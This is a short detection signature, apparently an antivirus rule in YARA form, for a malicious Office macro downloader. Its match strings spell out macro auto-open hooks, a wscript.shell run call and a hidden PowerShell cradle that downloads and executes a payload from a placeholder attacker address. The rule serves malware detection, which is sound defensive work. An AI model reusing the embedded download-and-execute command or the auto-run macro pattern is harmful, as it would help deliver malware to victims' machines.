
rule TrojanDownloader_O97M_EncDoc_PVAA_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.PVAA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {73 75 62 61 75 74 6f 6f 70 65 6e 28 29 } //1 subautoopen()
		$a_01_1 = {61 75 74 6f 5f 6f 70 65 6e 65 6e 64 73 75 62 73 75 62 77 6f 72 6b 62 6f 6f 6b 5f 6f 70 65 6e 28 29 } //1 auto_openendsubsubworkbook_open()
		$a_01_2 = {64 69 6d 63 6d 64 61 73 73 74 72 69 6e 67 63 6d 64 } //1 dimcmdasstringcmd
		$a_01_3 = {3d 22 70 6f 77 65 72 73 68 65 6c 6c 2d 6e 6f 70 2d 77 68 69 64 64 65 6e 2d 63 22 22 24 6b 3d 6e 65 77 2d 6f 62 6a 65 63 74 6e 65 74 2e 77 65 62 63 6c 69 65 6e 74 3b 24 6b 2e 70 72 6f 78 79 3d 5b 6e 65 74 2e 77 65 62 72 65 71 75 65 73 74 5d 3a 3a 67 65 74 73 79 73 74 65 6d 77 65 62 70 72 6f 78 79 28 29 3b 24 6b 2e 70 72 6f 78 79 2e 63 72 65 64 65 6e 74 69 61 6c 73 3d 5b 6e 65 74 2e 63 72 65 64 65 6e 74 69 61 6c 63 61 63 68 65 5d 3a 3a 64 65 66 61 75 6c 74 63 72 65 64 65 6e 74 69 61 6c 73 3b 69 65 78 24 6b 2e 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 3c 79 6f 75 72 5f 61 74 74 61 63 6b 65 72 5f 69 70 3e 3a 3c 70 6f 72 74 3e 2f 70 61 79 6c 6f 61 64 27 29 22 } //1 ="powershell-nop-whidden-c""$k=new-objectnet.webclient;$k.proxy=[net.webrequest]::getsystemwebproxy();$k.proxy.credentials=[net.credentialcache]::defaultcredentials;iex$k.downloadstring('http://<your_attacker_ip>:<port>/payload')"
		$a_01_4 = {63 72 65 61 74 65 6f 62 6a 65 63 74 28 22 77 73 63 72 69 70 74 2e 73 68 65 6c 6c 22 29 2e 72 75 6e 63 6d 64 } //1 createobject("wscript.shell").runcmd
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}